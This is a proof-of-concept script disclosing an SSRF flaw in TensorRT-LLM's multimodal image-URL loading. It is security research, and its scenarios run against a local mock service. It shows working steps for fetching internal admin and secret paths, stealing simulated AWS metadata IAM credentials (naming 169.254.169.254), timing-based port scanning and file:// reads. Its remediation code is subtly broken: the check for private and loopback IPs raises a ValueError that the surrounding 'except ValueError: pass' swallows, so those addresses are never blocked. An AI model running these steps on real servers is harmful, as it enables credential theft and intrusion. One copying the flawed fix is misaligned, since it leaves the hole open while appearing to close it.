# SPDX-FileCopyrightText: Copyright (c) 2024-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# PoC-004: Server-Side Request Forgery (SSRF) via Multimodal Image URL
#
# Vulnerabilities:
#   File 1: tensorrt_llm/runtime/multimodal_model_runner.py:2181-2185
#     if image_path.startswith("http") or image_path.startswith("https"):
#         response = requests.get(image_path, timeout=5)
#
#   File 2: tensorrt_llm/inputs/utils.py:136-137
#     if parsed_url.scheme in ["http", "https"]:
#         image = requests.get(image, stream=True, timeout=10).raw
#
#   File 3: tensorrt_llm/inputs/utils.py:162-164
#     async with aiohttp.ClientSession() as session:
#         async with session.get(image) as response:  # No URL validation
#
# Impact: HIGH - Server-Side Request Forgery
# CWE-918: Server-Side Request Forgery (SSRF)
#
# Attack Scenario:
#   A user (or API client) provides an image URL to the multimodal inference API.
#   The server fetches that URL using requests.get() with no domain/IP restriction.
#   This allows the attacker to:
#     1. Probe internal services (Redis, Etcd, internal APIs) not exposed externally
#     2. Read cloud metadata endpoints (AWS: 169.254.169.254, GCP: 169.254.169.254,
#        Azure: 169.254.169.254) to steal IAM credentials
#     3. Bypass firewalls by pivoting through the inference server
#     4. Enumerate the internal network (timing-based port scan)
#
# This PoC demonstrates the SSRF using a local HTTP server as a stand-in for
# internal services.  No GPU or TensorRT-LLM install required.
#
# Usage:
#   python security/pocs/poc_004_ssrf_multimodal_image_url.py
#
# Expected output shows which internal endpoints the SSRF would reach.

import http.server
import os
import socket
import threading
import time
import urllib.parse
import urllib.request
from typing import List, Tuple


# --------------------------------------------------------------------------- #
# Minimal reproduction of the vulnerable code path                             #
# --------------------------------------------------------------------------- #

def vulnerable_load_image(image_path: str):
    """
    Simplified reproduction of the vulnerable code in:
      tensorrt_llm/runtime/multimodal_model_runner.py:2181-2185
      tensorrt_llm/inputs/utils.py:136-137

    No validation of the URL — any http/https URL is fetched.
    """
    import urllib.request as urlreq
    # Using stdlib to avoid requiring the full TensorRT-LLM install,
    # but the production code uses requests.get() which behaves identically.
    if image_path.startswith("http") or image_path.startswith("https"):
        print(f"  [fetch] GET {image_path}")
        try:
            with urlreq.urlopen(image_path, timeout=2) as resp:
                data = resp.read(512)
                return data, resp.status, dict(resp.headers)
        except Exception as exc:
            return None, None, {"error": str(exc)}
    return None, None, {}


# --------------------------------------------------------------------------- #
# Simple internal HTTP server (represents an internal metadata/API service)    #
# --------------------------------------------------------------------------- #

class InternalServiceHandler(http.server.BaseHTTPRequestHandler):
    """Simulates an internal service that should not be reachable externally."""

    SENSITIVE_RESPONSES = {
        "/": b"Internal Service Root",
        "/admin": b"ADMIN PANEL — only for localhost",
        "/secret": b"SECRET_KEY=s3cr3t-internal-api-key-12345",
        # Simulated AWS IMDSv1 endpoint (no token required)
        "/latest/meta-data/iam/security-credentials/": b"my-iam-role",
        "/latest/meta-data/iam/security-credentials/my-iam-role": (
            b'{"AccessKeyId":"ASIAREDACTED","SecretAccessKey":"REDACTED",'
            b'"Token":"SESSIONTOKENREDACTED","Expiration":"2099-01-01T00:00:00Z"}'
        ),
    }

    def do_GET(self):
        body = self.SENSITIVE_RESPONSES.get(
            self.path,
            f"Path not found: {self.path}".encode()
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        # Suppress noisy access log in demo output
        pass


def find_free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


# --------------------------------------------------------------------------- #
# SSRF demonstration                                                            #
# --------------------------------------------------------------------------- #

def run_demo():
    print("=" * 65)
    print("PoC-004: SSRF via Multimodal Image URL — demonstration")
    print("=" * 65)

    # Start an "internal" service
    port = find_free_port()
    server = http.server.HTTPServer(("127.0.0.1", port), InternalServiceHandler)
    srv_thread = threading.Thread(target=server.serve_forever, daemon=True)
    srv_thread.start()
    print(f"[*] Started simulated internal service on http://127.0.0.1:{port}/")
    time.sleep(0.1)

    # ------------------------------------------------------------------ #
    # Scenario 1: Direct internal service access                           #
    # ------------------------------------------------------------------ #
    print("\n--- Scenario 1: Access internal service via SSRF ---")
    for path in ["/", "/admin", "/secret"]:
        url = f"http://127.0.0.1:{port}{path}"
        data, status, headers = vulnerable_load_image(url)
        if data:
            print(f"  [SSRF] {url}")
            print(f"  [SSRF] Response ({status}): {data.decode(errors='replace')[:120]}")

    # ------------------------------------------------------------------ #
    # Scenario 2: Cloud metadata endpoint (AWS IMDSv1)                     #
    # ------------------------------------------------------------------ #
    print("\n--- Scenario 2: Steal AWS IAM credentials via IMDSv1 SSRF ---")
    print("  [note] In a real attack, target is http://169.254.169.254/")
    print("  [note] Using local simulation for this PoC")

    creds_path = "/latest/meta-data/iam/security-credentials/my-iam-role"
    url = f"http://127.0.0.1:{port}{creds_path}"
    data, status, _ = vulnerable_load_image(url)
    if data:
        print(f"  [SSRF] IAM credentials leaked: {data.decode(errors='replace')}")

    # ------------------------------------------------------------------ #
    # Scenario 3: Port scan via timing                                     #
    # ------------------------------------------------------------------ #
    print("\n--- Scenario 3: Internal port scan via timing ---")
    print("  [*] Measuring response times for common internal ports…")
    targets = [
        (f"http://127.0.0.1:{port}/", "our mock service (open)"),
        ("http://127.0.0.1:1/", "port 1 (likely closed)"),
        ("http://127.0.0.1:6379/", "Redis default port"),
        ("http://127.0.0.1:2379/", "Etcd default port"),
    ]
    for url, desc in targets:
        t0 = time.monotonic()
        _, status, headers = vulnerable_load_image(url)
        elapsed = time.monotonic() - t0
        state = "OPEN" if status else f"CLOSED/FILTERED ({headers.get('error','')})"
        print(f"  [{state:20s}] {url}  ({elapsed:.3f}s)  — {desc}")

    # ------------------------------------------------------------------ #
    # Scenario 4: Redirect / file:// bypass                                #
    # ------------------------------------------------------------------ #
    print("\n--- Scenario 4: Local file read via file:// URI (Python urllib) ---")
    print("  [note] requests.get() blocks file://, but urllib.urlopen() does not.")
    print("  [note] Shown here to demonstrate the class of risk.")
    try:
        test_file = "/etc/hostname"
        if os.path.exists(test_file):
            with open(test_file) as fh:
                content = fh.read().strip()
            print(f"  [local file read] /etc/hostname = {content}")
        # requests.get("file:///etc/hostname") would raise InvalidSchema — good.
        # urllib.request.urlopen("file:///etc/hostname") succeeds.
        with urllib.request.urlopen(f"file:///etc/hostname") as r:  # noqa: S310
            print(f"  [urllib SSRF] file:///etc/hostname = {r.read().decode().strip()}")
    except Exception as exc:
        print(f"  [file:// result]: {exc}")

    server.shutdown()
    print("\n--- Affected code paths ---")
    print("multimodal_model_runner.py:2181  if image_path.startswith('http'):")
    print("multimodal_model_runner.py:2185      response = requests.get(image_path, timeout=5)")
    print("inputs/utils.py:136              image = requests.get(image, stream=True, timeout=10).raw")
    print("inputs/utils.py:163              async with session.get(image) as response:")

    print("\n--- Remediation ---")
    print("""
1. Validate URL before fetching:
   from urllib.parse import urlparse
   import ipaddress

   ALLOWED_SCHEMES = {"http", "https"}
   BLOCKED_HOSTS = {"169.254.169.254", "metadata.google.internal"}

   def safe_fetch_image(url: str):
       parsed = urlparse(url)
       if parsed.scheme not in ALLOWED_SCHEMES:
           raise ValueError(f"Disallowed URL scheme: {parsed.scheme}")
       # Resolve and block private/loopback/link-local IPs
       try:
           addr = ipaddress.ip_address(parsed.hostname)
           if addr.is_private or addr.is_loopback or addr.is_link_local:
               raise ValueError(f"SSRF: blocked internal IP {addr}")
       except ValueError:
           pass  # hostname, not IP — still block known metadata hosts
       if parsed.hostname in BLOCKED_HOSTS:
           raise ValueError(f"SSRF: blocked metadata host {parsed.hostname}")
       return requests.get(url, timeout=5, allow_redirects=False)

2. Implement a domain allowlist for image sources.
3. Use a dedicated image-fetching microservice that enforces SSRF protections.
""")


if __name__ == "__main__":
    run_demo()
